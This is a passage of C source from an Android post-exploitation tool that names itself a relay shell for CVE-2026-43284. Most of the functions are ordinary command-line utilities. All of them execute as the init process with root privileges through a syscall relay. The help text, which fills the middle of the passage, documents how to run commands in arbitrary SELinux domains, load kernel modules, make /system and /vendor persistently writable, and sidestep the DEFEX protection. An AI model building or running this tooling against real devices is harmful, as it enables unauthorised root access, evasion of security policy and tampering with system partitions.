            int remaining = (int)(n - i);
            if (remaining > 16) remaining = 16;
            if (max_bytes >= 0) {
                int left = max_bytes - (int)(offset + (uint64_t)i);
                if (left < remaining) remaining = left;
            }

            if (data_fmt == 'x') {
                for (int j = 0; j < remaining; j += 2) {
                    if (j+1 < remaining)
                        printf(" %02x%02x", buf[i+j], buf[i+j+1]);
                    else
                        printf(" %02x  ", buf[i+j]);
                }
            } else if (data_fmt == 'c') {
                for (int j = 0; j < remaining; j++) {
                    uint8_t c = buf[i+j];
                    if (c=='\n') printf("  \\n"); else if (c=='\t') printf("  \\t");
                    else if (c=='\r') printf("  \\r"); else if (c=='\0') printf("  \\0");
                    else if (c>=32 && c<127) printf("   %c", c);
                    else printf(" %03o", c);
                }
            } else if (data_fmt == 'u') {
                for (int j = 0; j < remaining; j += 2) {
                    if (j+1 < remaining) {
                        uint16_t v = (uint16_t)buf[i+j]|((uint16_t)buf[i+j+1]<<8);
                        printf(" %5u", v);
                    } else printf(" %5u", buf[i+j]);
                }
            } else {
                for (int j = 0; j < remaining; j += 2) {
                    if (j+1 < remaining) {
                        uint16_t v = (uint16_t)buf[i+j]|((uint16_t)buf[i+j+1]<<8);
                        printf(" %06o", v);
                    } else printf(" %06o", buf[i+j]);
                }
            }
            printf("\n");
        }
        offset += (uint64_t)n;
    }

    if (addr_fmt == 'x') printf("%07llx\n", (unsigned long long)offset);
    else if (addr_fmt == 'd') printf("%07lld\n", (long long)offset);
    else printf("%07llo\n", (unsigned long long)offset);

    relay_close(sock, fd);
    return 0;
}

/* fold: wrap lines at specified width */
static int cmd_fold(int sock, int argc, char *argv[]) {
    int width = 80;
    const char *filepath = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-w") == 0 && i + 1 < argc) {
            width = atoi(argv[++i]);
            if (width <= 0) width = 80;
        } else if (argv[i][0] != '-') {
            filepath = argv[i];
        }
    }

    if (!filepath) {
        fprintf(stderr, "fold: Usage: fold [-w width] <file>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(filepath, abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "fold: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    int col = 0;
    for (;;) {
        if (g_sigint) { g_sigint = 0; break; }
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;

        for (int64_t i = 0; i < n; i++) {
            if (buf[i] == '\n') { putchar('\n'); col = 0; }
            else {
                if (col >= width) { putchar('\n'); col = 0; }
                putchar(buf[i]); col++;
            }
        }
    }
    if (col > 0) putchar('\n');

    relay_close(sock, fd);
    fflush(stdout);
    return 0;
}

/* factor: factorize numbers */
static int cmd_factor(int sock, int argc, char *argv[]) {
    (void)sock;
    if (argc < 2) {
        fprintf(stderr, "factor: Usage: factor <number...>\n");
        return 1;
    }

    for (int i = 1; i < argc; i++) {
        uint64_t n = strtoull(argv[i], NULL, 10);
        printf("%llu:", (unsigned long long)n);
        if (n == 0) { printf(" 0\n"); continue; }

        uint64_t val = n;
        while (val % 2 == 0) { printf(" 2"); val /= 2; }
        for (uint64_t d = 3; d * d <= val; d += 2) {
            while (val % d == 0) { printf(" %llu", (unsigned long long)d); val /= d; }
        }
        if (val > 1) printf(" %llu", (unsigned long long)val);
        printf("\n");
    }
    return 0;
}

/* cal: display calendar */
static int cmd_cal(int sock, int argc, char *argv[]) {
    (void)sock;

    int month = 0, year = 0;
    if (argc >= 3) { month = atoi(argv[1]); year = atoi(argv[2]); }
    else if (argc == 2) { year = atoi(argv[1]); }

    time_t now = time(NULL);
    struct tm *tm = localtime(&now);

    if (year == 0) year = tm->tm_year + 1900;
    if (month == 0 && argc < 3) month = tm->tm_mon + 1;

    static const char *month_names[] = {
        "", "January", "February", "March", "April", "May", "June",
        "July", "August", "September", "October", "November", "December"
    };

    if (month == 0) {
        printf("                            %d\n\n", year);
        for (int m = 1; m <= 12; m++) {
            char title[32];
            snprintf(title, sizeof(title), "%s %d", month_names[m], year);
            int pad = (20 - (int)strlen(title)) / 2;
            for (int p = 0; p < pad; p++) putchar(' ');
            printf("%s\n", title);
            printf("Su Mo Tu We Th Fr Sa\n");

            int y = year, mo = m;
            if (mo < 3) { mo += 12; y--; }
            int dow = (1 + (13*(mo+1))/5 + y + y/4 - y/100 + y/400) % 7;
            dow = (dow + 6) % 7;

            int days_in[13] = {0,31,28,31,30,31,30,31,31,30,31,30,31};
            if (m==2 && (year%4==0 && (year%100!=0 || year%400==0))) days_in[2]=29;

            for (int d = 0; d < dow; d++) printf("   ");
            for (int d = 1; d <= days_in[m]; d++) {
                printf("%2d ", d);
                if ((d + dow) % 7 == 0) printf("\n");
            }
            if ((days_in[m] + dow) % 7 != 0) printf("\n");
            printf("\n");
        }
        return 0;
    }

    if (month < 1 || month > 12) {
        fprintf(stderr, "cal: invalid month: %d\n", month);
        return 1;
    }

    char title[32];
    snprintf(title, sizeof(title), "%s %d", month_names[month], year);
    int pad = (20 - (int)strlen(title)) / 2;
    for (int p = 0; p < pad; p++) putchar(' ');
    printf("%s\n", title);
    printf("Su Mo Tu We Th Fr Sa\n");

    int y = year, mo = month;
    if (mo < 3) { mo += 12; y--; }
    int dow = (1 + (13*(mo+1))/5 + y + y/4 - y/100 + y/400) % 7;
    dow = (dow + 6) % 7;

    int days_in[13] = {0,31,28,31,30,31,30,31,31,30,31,30,31};
    if (month==2 && (year%4==0 && (year%100!=0 || year%400==0))) days_in[2]=29;

    for (int d = 0; d < dow; d++) printf("   ");
    for (int d = 1; d <= days_in[month]; d++) {
        printf("%2d ", d);
        if ((d + dow) % 7 == 0) printf("\n");
    }
    if ((days_in[month] + dow) % 7 != 0) printf("\n");

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Hardware enumeration (lspci, lsusb)
 * ═══════════════════════════════════════════════════════════════════════════ */

/* lspci: list PCI devices from sysfs */
static int cmd_lspci(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;

    int64_t dfd = relay_openat(sock, "/sys/bus/pci/devices",
                               MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) {
        fprintf(stderr, "lspci: /sys/bus/pci/devices: %s\n", errno_str((int)(-dfd)));
        return 1;
    }

    for (;;) {
        if (g_sigint) { g_sigint = 0; break; }
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, dfd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;

            if (d_name[0] != '.') {
                char classpath[CWD_SIZE], vendpath[CWD_SIZE], devpath[CWD_SIZE];
                snprintf(classpath, sizeof(classpath),
                         "/sys/bus/pci/devices/%s/class", d_name);
                snprintf(vendpath, sizeof(vendpath),
                         "/sys/bus/pci/devices/%s/vendor", d_name);
                snprintf(devpath, sizeof(devpath),
                         "/sys/bus/pci/devices/%s/device", d_name);

                char cls[32]="????", vend[32]="????", dev[32]="????";
                uint8_t *data; ssize_t sz;

                sz = relay_read_file(sock, classpath, &data, 32);
                if (sz>0) { data[sz]=0; if(data[sz-1]=='\n') data[sz-1]=0;
                    strncpy(cls,(char*)data,sizeof(cls)-1); free(data); }

                sz = relay_read_file(sock, vendpath, &data, 32);
                if (sz>0) { data[sz]=0; if(data[sz-1]=='\n') data[sz-1]=0;
                    strncpy(vend,(char*)data,sizeof(vend)-1); free(data); }

                sz = relay_read_file(sock, devpath, &data, 32);
                if (sz>0) { data[sz]=0; if(data[sz-1]=='\n') data[sz-1]=0;
                    strncpy(dev,(char*)data,sizeof(dev)-1); free(data); }

                printf("%s Class %s: %s:%s\n", d_name, cls, vend, dev);
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, dfd);
    return 0;
}

/* lsusb: list USB devices from sysfs */
static int cmd_lsusb(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;

    int64_t dfd = relay_openat(sock, "/sys/bus/usb/devices",
                               MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) {
        fprintf(stderr, "lsusb: /sys/bus/usb/devices: %s\n", errno_str((int)(-dfd)));
        return 1;
    }

    for (;;) {
        if (g_sigint) { g_sigint = 0; break; }
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, dfd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;

            if (d_name[0] != '.') {
                char vendpath[CWD_SIZE], prodpath[CWD_SIZE];
                char mfgpath[CWD_SIZE], prodnamepath[CWD_SIZE];
                snprintf(vendpath, sizeof(vendpath),
                         "/sys/bus/usb/devices/%s/idVendor", d_name);
                snprintf(prodpath, sizeof(prodpath),
                         "/sys/bus/usb/devices/%s/idProduct", d_name);
                snprintf(mfgpath, sizeof(mfgpath),
                         "/sys/bus/usb/devices/%s/manufacturer", d_name);
                snprintf(prodnamepath, sizeof(prodnamepath),
                         "/sys/bus/usb/devices/%s/product", d_name);

                uint8_t *data; ssize_t sz;
                char vend[16]="", prod[16]="", mfg[128]="", pname[128]="";

                sz = relay_read_file(sock, vendpath, &data, 16);
                if (sz > 0) {
                    data[sz]=0; if(data[sz-1]=='\n') data[sz-1]=0;
                    strncpy(vend,(char*)data,sizeof(vend)-1); free(data);
                } else { pos += d_reclen; continue; }

                sz = relay_read_file(sock, prodpath, &data, 16);
                if (sz>0) { data[sz]=0; if(data[sz-1]=='\n') data[sz-1]=0;
                    strncpy(prod,(char*)data,sizeof(prod)-1); free(data); }

                sz = relay_read_file(sock, mfgpath, &data, 128);
                if (sz>0) { data[sz]=0; if(data[sz-1]=='\n') data[sz-1]=0;
                    strncpy(mfg,(char*)data,sizeof(mfg)-1); free(data); }

                sz = relay_read_file(sock, prodnamepath, &data, 128);
                if (sz>0) { data[sz]=0; if(data[sz-1]=='\n') data[sz-1]=0;
                    strncpy(pname,(char*)data,sizeof(pname)-1); free(data); }

                printf("Bus %s ID %s:%s", d_name, vend, prod);
                if (mfg[0] || pname[0]) printf(" %s %s", mfg, pname);
                printf("\n");
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, dfd);
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * Command: help (dispatch table driven)
 * ═══════════════════════════════════════════════════════════════════════════ */

static int cmd_help(int sock, int argc, char *argv[]) {
    (void)sock;

    if (argc >= 2) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, argv[1]) == 0) {
                printf("Usage: %s\n", commands[i].usage);
                return 0;
            }
        }
        printf("No help available for '%s'\n", argv[1]);
        return 1;
    }

    printf(
        "DFI Init Relay Shell -- CVE-2026-43284\n"
        "Connected to init (PID 1, UID 0, u:r:init:s0)\n"
        "All commands execute as init via raw syscall relay.\n"
        "\n"
    );

    /* Print commands from dispatch table */
    int cmd_total = 0;
    for (int ci = 0; commands[ci].name; ci++) cmd_total++;
    printf("AVAILABLE COMMANDS (%d total):\n\n", cmd_total);

    printf("FILE OPERATIONS:\n");
    const char *file_cmds[] = {"ls","cd","cat","cp","mv","rm","mkdir","rmdir","chmod","chown",
        "stat","touch","echo","ln","readlink","realpath","file","du","df","truncate",
        "install","cmp","tee","rename","mknod","mktemp","dd","sync",NULL};
    for (int j = 0; file_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, file_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nTEXT PROCESSING:\n");
    const char *text_cmds[] = {"head","tail","grep","wc","sort","uniq","cut","tr","sed",
        "awk","tac","rev","nl","expand","paste","comm","diff","strings","xxd",
        "hexdump","base64","od","fold",NULL};
    for (int j = 0; text_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, text_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nSECURITY & ANALYSIS:\n");
    const char *sec_cmds[] = {"sha256sum","sha1sum","md5sum","cksum","readelf","lsof","syscall",
        "maps","status","getfattr","setfattr","inotifywait",NULL};
    for (int j = 0; sec_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, sec_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nDIRECTORY/SEARCH:\n");
    const char *dir_cmds[] = {"find","xargs","dirname","basename","pwd",NULL};
    for (int j = 0; dir_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, dir_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nPROCESS/SYSTEM:\n");
    const char *proc_cmds[] = {"ps","kill","killall","pidof","pgrep","pkill","id","whoami",
        "uptime","free","uname","hostname","dmesg","date","sleep","nproc","printenv",
        "groups","logname","lsmod","vmstat","swaps","mountpoint","watch",
        "nice","renice","ionice","taskset","ulimit","getcap","tty",NULL};
    for (int j = 0; proc_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, proc_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nSELINUX:\n");
    const char *se_cmds[] = {"getenforce","setenforce","chcon","getcon",NULL};
    for (int j = 0; se_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, se_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nNETWORK:\n");
    const char *net_cmds[] = {"netstat","ss","ifconfig",NULL};
    for (int j = 0; net_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, net_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nBLOCK DEVICES:\n");
    const char *blk_cmds[] = {"blockdev","losetup","lsblk","blkid","lspci","lsusb",NULL};
    for (int j = 0; blk_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, blk_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nFILESYSTEM MANAGEMENT:\n");
    const char *fs_cmds[] = {"mount","umount","swapon","swapoff","mkswap","pivot_root","chroot","sysctl",NULL};
    for (int j = 0; fs_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, fs_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nBOOT / PARTITION INFO:\n");
    const char *boot_cmds[] = {"fstab","slot","bootconfig","kernelcmdline",
        "dmsetup","overlay","verity","partitions","gsi","dm",NULL};
    for (int j = 0; boot_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, boot_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nKERNEL MODULES:\n");
    const char *mod_cmds[] = {"insmod","rmmod","modinfo",NULL};
    for (int j = 0; mod_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, mod_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nDOMAIN EXEC ***EXPERIMENTAL***:\n");
    const char *dexec_cmds[] = {"exec","dexec",NULL};
    for (int j = 0; dexec_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, dexec_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nINIT-SPECIFIC / SYSTEM CONTROL:\n");
    const char *init_cmds[] = {"getprop","setprop","raw",
        "reboot","unshare","nsenter",NULL};
    for (int j = 0; init_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, init_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf("\nMISC:\n");
    const char *misc_cmds[] = {"yes","true","false","seq","printf","test","[","expr",
        "factor","cal","env","which","clear","time","help",NULL};
    for (int j = 0; misc_cmds[j]; j++) {
        for (int i = 0; commands[i].name; i++) {
            if (strcmp(commands[i].name, misc_cmds[j]) == 0)
                printf("  %-32s %s\n", commands[i].usage, "");
        }
    }

    printf(
        "\nSHELL NOTES:\n"
        "  - All built-in commands execute as init (PID 1, u:r:init:s0)\n"
        "  - Pipes (|) supported: left side runs via relay, right side\n"
        "    runs locally (e.g. ls -la | grep foo, cat file | head -20)\n"
        "  - File redirects (>, >>) work with echo and cat\n"
        "  - Ctrl+C interrupts current operation, Ctrl+D exits\n"
        "  - Type 'help <command>' for usage of a specific command\n"
        "\n"
        "═══════════════════════════════════════════════════════════════\n"
        "  CROSS-DOMAIN EXECUTION (dexec)\n"
        "═══════════════════════════════════════════════════════════════\n"
        "\n"
        "dexec is the most powerful command in this shell. It lets you\n"
        "execute commands as ANY non-zygote SELinux domain reachable\n"
        "from init — tee, vold, installd, netd, vendor_modprobe, etc.\n"
        "\n"
        "HOW INIT EXECUTES BINARIES:\n"
        "  Init has ZERO execute_no_trans permissions. There is no way\n"
        "  to execute a binary or any other file type and stay in\n"
        "  u:r:init:s0. The only binaries init can run are those with\n"
        "  an *_exec file label, and running them forces an immediate\n"
        "  domain transition. /system/bin/vold is labeled vold_exec —\n"
        "  when init runs it, it forks, and its child becomes\n"
        "  u:r:vold:s0 instantly, with no ability to return to the\n"
        "  init domain.\n"
        "\n"
        "SYNTAX:\n"
        "  dexec -d <domain> <command> [args...]   Explicit domain\n"
        "  dexec --domain=<domain> <cmd> [args...]  Same, long form\n"
        "  dexec <binary> [args...]                 Auto from file label\n"
        "  /absolute/path [args...]                 Same as dexec <path>\n"
        "\n"
        "DOMAIN ARGUMENT (-d):\n"
        "  Short name:   -d installd        -> u:r:installd:s0\n"
        "  Short name:   -d tee             -> u:r:tee:s0\n"
        "  Full context: -d u:r:netd:s0     -> used as-is\n"
        "\n"
        "MODES:\n"
        "  EXPLICIT DOMAIN (-d flag):\n"
        "    Sets the domain directly. Everything after the domain is\n"
        "    the command to run in that domain's namespace.\n"
        "      dexec -d tee sh -c \"ls /data/tee\"\n"
        "      dexec -d installd sh /path/to/script.sh\n"
        "      dexec -d vendor_modprobe insmod /path/to/module.ko\n"
        "\n"
        "  AUTO DOMAIN (no -d flag):\n"
        "    The binary's SELinux file label determines the domain.\n"
        "    All Android binaries have *_exec labels, so init always\n"
        "    transitions into the binary's domain.\n"
        "      dexec /system/bin/installd sh -c \"ls /data\"\n"
        "        -> label=installd_exec -> domain=installd\n"
        "        -> sh -c \"ls /data\" runs as installd\n"
        "      dexec /vendor/bin/insmod /path/to/module.ko\n"
        "        -> label=vendor_modprobe_exec -> insmod runs as\n"
        "           vendor_modprobe with the module path as its arg\n"
        "      /system/bin/toybox id\n"
        "        -> auto-exec: domain=toolbox, toybox id runs\n"
        "\n"
        "HOW IT WORKS:\n"
        "  1. Reads the binary's SELinux label (or uses -d)\n"
        "  2. Writes context to /proc/self/attr/exec (setexeccon)\n"
        "  3. Forks via CLONE_VFORK — relay stays alive\n"
        "  4. Child calls execve — kernel applies the domain\n"
        "  5. Parent resumes — relay connection never breaks\n"
        "  6. Child runs up to 5 seconds, then SIGKILL\n"
        "\n"
        "OUTPUT:\n"
        "  Stdout/stderr of the exec'd process go to /dev/null.\n"
        "  This is kernel-enforced: SELinux replaces all inherited\n"
        "  file descriptors that the new domain can't use.\n"
        "  Output you CAN see: logcat messages from the binary\n"
        "  (most Android system binaries log via liblog, not stdout).\n"
        "  dexec starts a logcat listener automatically.\n"
        "  Built-in commands (ls, cat, ps) are NOT affected.\n"
        "\n"
        "LIMITATIONS:\n"
        "  - Init CANNOT execute in its own domain. Every exec forks\n"
        "    and transitions. There is no execute_no_trans.\n"
        "  - Stdout/stderr NOT captured. Only logcat output visible.\n"
        "  - Zygote-managed app domains NOT reachable.\n"
        "  - The binary must be a valid entrypoint for the target\n"
        "    domain, or execve returns EACCES.\n"
        "  - No environment variables (envp=NULL). Use full paths\n"
        "    or sh -c \"PATH=/system/bin cmd\" if needed.\n"
        "  - 5-second timeout. Long-running processes SIGKILLed.\n"
        "  - Bare names resolved from /system/bin, /vendor/bin,\n"
        "    /product/bin, /system_ext/bin, and /apex/*/bin.\n"
        "\n"
        "EXAMPLES:\n"
        "  dexec -d tee sh -c \"ls /data/tee\"        TEE domain shell\n"
        "  dexec -d installd sh -c \"ls /data/app\"   Browse as installd\n"
        "  dexec -d vold sh -c \"mount\"              Mounts from vold\n"
        "  dexec -d netd sh -c \"iptables -L\"        Firewall as netd\n"
        "  dexec /vendor/bin/insmod /path/module.ko  Load kernel module\n"
        "  /system/bin/toybox id                     Auto-exec via dexec\n"
        "\n"
        "═══════════════════════════════════════════════════════════════\n"
        "  OVERLAYFS (overlay)\n"
        "═══════════════════════════════════════════════════════════════\n"
        "\n"
        "Mount a persistent read-write OverlayFS on any read-only\n"
        "partition (/system, /vendor, /product, /system_ext, etc.)\n"
        "directly from init. Writes land on /data and persist across\n"
        "reboots — re-run 'overlay setup' after each boot to activate.\n"
        "\n"
        "SYNTAX:\n"
        "  overlay setup [partition]      Mount RW overlay (default: /system)\n"
        "  overlay status                 Show all active overlays\n"
        "  overlay teardown [partition]   Unmount overlay (default: /system)\n"
        "\n"
        "WHAT HAPPENS DURING SETUP:\n"
        "  1. Verify relay is running as init (UID 0)\n"
        "  2. Check target isn't already overlaid (prevents stacking)\n"
        "  3. Set SELinux fscreate to u:object_r:overlayfs_file:s0\n"
        "  4. Create /data/overlay/<part>/upper and /data/overlay/<part>/work\n"
        "  5. Restore default fscreate context\n"
        "  6. Check mount propagation state (shared vs private)\n"
        "  7. Make target MS_PRIVATE for safe overlay mount\n"
        "  8. Verify kernel has overlayfs + detect userxattr support\n"
        "  9. mount(\"overlay\", target, \"overlay\", MS_NOATIME, options)\n"
        "  9b. Relabel overlay root to overlayfs_file (fixes unlabeled:s0)\n"
        " 10. Restore MS_SHARED so all apps see the overlay\n"
        "\n"
        "GENERAL-PURPOSE MOUNT (mount):\n"
        "  mount [-rsvw] [-t TYPE] [-o OPTS] [DEVICE] DIR\n"
        "  mount --bind <source> <target>\n"
        "  mount --move <source> <target>\n"
        "  mount -o shared <path>        Set MS_SHARED propagation\n"
        "  mount -o private <path>       Set MS_PRIVATE propagation\n"
        "  mount -o remount,rw <path>    Remount with new flags\n"
        "\n"
        "EXAMPLES:\n"
        "  overlay setup                  Overlay /system (RW)\n"
        "  overlay setup /vendor          Overlay /vendor (RW)\n"
        "  overlay setup /system_ext      Overlay /system_ext (RW)\n"
        "  overlay status                 List all overlays with paths\n"
        "  overlay teardown /system       Remove /system overlay\n"
        "\n"
        "NOTES:\n"
        "  - Kernel 5.15+ adds userxattr automatically (detected at runtime)\n"
        "  - Kernel 4.x works but without userxattr\n"
        "  - Overlay detection checks fs type, not source name — detects\n"
        "    overlays from any tool (Magisk, adb remount, fs_mgr)\n"
        "  - If target has submounts, mount may succeed but submounts\n"
        "    will be shadowed. Check /proc/self/mountinfo before setup.\n"
        "  - DEFEX exempts PID 1 — mount() is never blocked for init\n"
    );
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * fs_mgr / sysfs / proc informational commands (Task 1 + Task 3)
 *
 * These wrap raw file reads from procfs/sysfs — no C++ methods.
 * Init itself discovers this information the same way at boot.
 * ═══════════════════════════════════════════════════════════════════════════ */

/* ── fstab: parse /proc/mounts, /proc/self/mountinfo, fstab files ───────── */
static int cmd_fstab(int sock, int argc, char *argv[]) {
    const char *target = NULL;
    int show_mountinfo = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--mountinfo") == 0)
            show_mountinfo = 1;
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("fstab [-i|--mountinfo] [mountpoint|device]\n"
                   "  (no args)        show /proc/mounts\n"
                   "  -i, --mountinfo  show /proc/self/mountinfo (verbose)\n"
                   "  <path>           filter for specific mountpoint or device\n"
                   "\n"
                   "Also tries: /vendor/etc/fstab.*, /odm/etc/fstab.*\n");
            return 0;
        } else {
            target = argv[i];
        }
    }

    const char *path = show_mountinfo ? "/proc/self/mountinfo" : "/proc/mounts";

    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, path, &data, 0);
    if (sz <= 0 || !data) {
        fprintf(stderr, "fstab: cannot read %s: %s\n", path,
                sz < 0 ? errno_str((int)-sz) : "empty");
        free(data);
        return 1;
    }
    data[sz] = '\0';

    /* Print, optionally filtering by target */
    char *line = (char *)data;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        if (target == NULL || strstr(line, target) != NULL) {
            printf("%s\n", line);
        }
        if (!nl) break;
        line = nl + 1;
    }
    free(data);

    /* Also show vendor fstab files if no filter or filter matches */
    if (target == NULL) {
        const char *fstab_paths[] = {
            "/vendor/etc/fstab.qcom",
            "/vendor/etc/fstab.default",
            "/odm/etc/fstab.qcom",
            "/odm/etc/fstab.default",
            NULL
        };
        for (int i = 0; fstab_paths[i]; i++) {
            uint8_t statbuf[128];
            int64_t sr = relay_fstatat(sock, fstab_paths[i], statbuf, sizeof(statbuf));
            if (sr >= 0) {
                printf("\n── %s ──\n", fstab_paths[i]);
                relay_cat_file(sock, fstab_paths[i]);
            }
        }
    }

    return 0;
}

/* ── slot: read current A/B slot from /proc/cmdline ─────────────────────── */
static int cmd_slot(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;

    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/cmdline", &data, 0);
    if (sz <= 0 || !data) {
        fprintf(stderr, "slot: cannot read /proc/cmdline\n");
        free(data);
        return 1;
    }
    data[sz] = '\0';

    /* Look for androidboot.slot_suffix= */
    const char *key = "androidboot.slot_suffix=";
    char *p = strstr((char *)data, key);
    if (p) {
        p += strlen(key);
        char slot[16] = {0};
        int j = 0;
        while (*p && *p != ' ' && *p != '\n' && j < 15) slot[j++] = *p++;
        printf("Current slot: %s\n", slot);
    } else {
        /* Try androidboot.slot= */
        key = "androidboot.slot=";
        p = strstr((char *)data, key);
        if (p) {
            p += strlen(key);
            char slot[16] = {0};
            int j = 0;
            while (*p && *p != ' ' && *p != '\n' && j < 15) slot[j++] = *p++;
            printf("Current slot: %s\n", slot);
        } else {
            printf("No A/B slot information found (non-A/B device?)\n");
        }
    }

    free(data);
    return 0;
}

/* ── bootconfig: parse /proc/bootconfig ─────────────────────────────────── */
static int cmd_bootconfig(int sock, int argc, char *argv[]) {
    const char *filter = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("bootconfig [key]\n"
                   "  (no args)  dump /proc/bootconfig\n"
                   "  <key>      filter for specific key\n");
            return 0;
        } else {
            filter = argv[i];
        }
    }

    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/bootconfig", &data, 0);
    if (sz <= 0 || !data) {
        /* bootconfig may not exist on older kernels */
        fprintf(stderr, "bootconfig: /proc/bootconfig not available\n");
        free(data);
        return 1;
    }
    data[sz] = '\0';

    char *line = (char *)data;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        if (filter == NULL || strstr(line, filter) != NULL) {
            printf("%s\n", line);
        }
        if (!nl) break;
        line = nl + 1;
    }

    free(data);
    return 0;
}

/* ── kernelcmdline: parse /proc/cmdline ─────────────────────────────────── */
static int cmd_kernelcmdline(int sock, int argc, char *argv[]) {
    const char *filter = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("kernelcmdline [key]\n"
                   "  (no args)  dump /proc/cmdline (space-separated → one per line)\n"
                   "  <key>      filter for specific key\n");
            return 0;
        } else {
            filter = argv[i];
        }
    }

    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/cmdline", &data, 0);
    if (sz <= 0 || !data) {
        fprintf(stderr, "kernelcmdline: cannot read /proc/cmdline\n");
        free(data);
        return 1;
    }
    data[sz] = '\0';

    /* Split on spaces and print one param per line */
    char *tok = strtok((char *)data, " \t\n");
    while (tok) {
        if (filter == NULL || strstr(tok, filter) != NULL) {
            printf("%s\n", tok);
        }
        tok = strtok(NULL, " \t\n");
    }

    free(data);
    return 0;
}

/* ── dmsetup: read device-mapper info from sysfs ────────────────────────── */
static int cmd_dmsetup(int sock, int argc, char *argv[]) {
    const char *filter = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("dmsetup [name]\n"
                   "  (no args)  list all dm devices from /sys/block/dm-*\n"
                   "  <name>     filter for specific device name\n");
            return 0;
        } else {
            filter = argv[i];
        }
    }

    /* Enumerate /sys/block/ for dm-* entries */
    int64_t dfd = relay_openat(sock, "/sys/block", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) {
        fprintf(stderr, "dmsetup: cannot open /sys/block: %s\n", errno_str((int)-dfd));
        return 1;
    }

    uint8_t dents[DATA_SIZE];
    int found = 0;
    for (;;) {
        int64_t n = relay_getdents64(sock, dfd, dents, DATA_SIZE);
        if (n <= 0) break;
        uint8_t *pos = dents;
